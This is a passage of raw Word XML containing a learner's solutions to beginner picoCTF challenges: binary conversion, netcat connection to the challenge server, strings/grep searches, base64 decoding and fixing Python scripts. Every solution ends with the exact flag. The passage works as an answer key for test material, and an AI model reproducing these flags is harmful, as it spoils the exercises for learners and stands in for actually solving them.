          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">D=13 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3E904E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>3=32+16</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D32E5DE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>13+32+16=61</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A92DD7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{61}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19509A27" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44368630" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>2Warm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC6A5DE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">Can you convert the number 42 (base 10) to binary (base 2)? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D62BF6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{101010}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00614F04" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>what's a net cat?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30210D58" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F09A7FB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using netcat (nc) is going to be pretty important. Can you connect to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>jupiter.challenges.picoctf.org</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> at port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>64287</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to get the flag?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307E4D8F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu:~$ nc jupiter.challenges.picoctf.org  64287</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="787226B6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>You're on your way to becoming the net cat master</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E44040F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF{nEtCat_Mast3ry_284be8f7}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225C9BAD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55CD08B9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>strings it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D488FC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3597F4FA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you find the flag in </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> without running it?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219DF4F6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43CB488D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ strings strings &gt;s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AB1220" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ grep pico s</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E34BB7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{5tRIng5_1T_827aee91}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BDC6925" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51BA9D16" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Bases</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F293D83" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C29D9B3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C91A5D6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A93B552" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What does this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>bDNhcm5fdGgzX3IwcDM1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> mean? I think it has something to do with bases.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9FD592" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Base64 decode</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D10028" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{l3arn_th3_r0p35}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FFC842" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14B281FE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>First Grep</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F31A3F9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E6C51DC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8D4CED" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Alex Fulton/Danny Tunitis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CCD812" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2489F851" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you find the flag in </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>file</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>? This would be really tedious to look through manually, something tells me there is a better way.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C0803BB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ grep pico file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8401A3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{grep_is_good_to_find_things_dba08a45}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753FA8D9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="263D767C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Codebook</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF72B05" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3A2C98" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51CD8B86" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556E7862" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0D263D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run the Python script </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>code.py</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the same directory as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>codebook.txt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3580B572" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:hyperlink r:id="rId8" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download code.py</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BDB49A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="707"/>
        </w:tabs>
      </w:pPr>
      <w:hyperlink r:id="rId9" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download codebook.txt</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79C637C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ python3 code.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4456EA91" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{c0d3b00k_455157_7d102d7a}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5571A0B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="032F060A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>convertme.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E076FA5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E52E7C2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D91CDA7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8B40C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52410C93" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Run the Python script and convert the given number from decimal to binary to get the flag. </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="248C4E07" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="359A283A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ python3 convertme.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7606100F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>If 62 is in decimal base, what is it in binary base?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A30B3B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Answer: 111110</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46F2B2F8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>That is correct! Here's your flag: picoCTF{4ll_y0ur_b4535_762f748e}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C8BA72" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>fixme1.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA585E7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0EA444" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC0AB21" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0971F672" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740824A4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Fix the syntax error in this Python script to print the flag. </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="77728E60" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ python3 fixme1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00CD012C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">  File "fixme1.py", line 20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B2B80B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    print('That is correct! Here\'s your flag: ' + flag)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4B6DA5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    ^</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABA043F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>IndentationError: unexpected indent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D41AC4C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ nano fixme1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7B970E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">caro@ubuntu:~/Downloads$ python3 fixme1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F5EDDCF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>That is correct! Here's your flag: picoCTF{1nd3nt1ty_cr1515_09ee727a}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0570336E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C71C5A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73B83E1A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>fixme2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E33729D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C0E4F4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011C181F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT 'syreal' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD60892" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0713A26F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Fix the syntax error in the Python script to print the flag. </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Download Python script</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="174B2FB1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>if flag = ="":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A714D57" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
